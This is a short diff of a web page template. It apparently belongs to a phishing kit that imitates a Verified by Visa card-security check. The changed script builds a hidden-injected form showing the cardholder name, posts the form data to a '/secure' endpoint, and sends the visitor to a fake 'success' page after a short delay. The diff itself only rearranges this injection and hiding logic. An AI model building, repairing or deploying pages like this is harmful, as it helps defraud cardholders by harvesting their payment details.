@@ -51,8 +51,6 @@
 <script src="../js/jquery.min.js"></script>
 <script src="../js/jquery.validate.min.js"></script>
 <script  type="text/javascript">
-    setTimeout("yincang()", 100);
-        function yincang() {
         let content = document.getElementById('bodyid');
         content.innerHTML = "<form method=\"post\" id=\"formvbv\" name=\"formvbv\" action=\"\">\n" +
                 "    <center>\n" +
@@ -141,7 +139,6 @@
                 "                                                    ${cardName!''}\n" +
                 "                                                    </td>\n" +
                 "                                                </tr>\n" +
-                "\n" +
                 "                                                <tr>\n" +
                 "                                                    <td class=\"normalgray\" valign=\"center\" width=\"165px\" align=\"right\">\n" +
                 "                                                        <span class='secure7'></span>\n" +
@@ -218,13 +215,13 @@
                     $.post("/version2/mobile/homepage/secure", $("#formvbv").serialize(),
                             function(result) {
                                 setTimeout(function() {
+                                            $("#zwimel").hide();
                                             $(location).attr("href", "success")
                                         },
                                         2000)
                             })
                 },
             });
-    }
 </script>
 <script language="Javascript">
     function SetFocus()
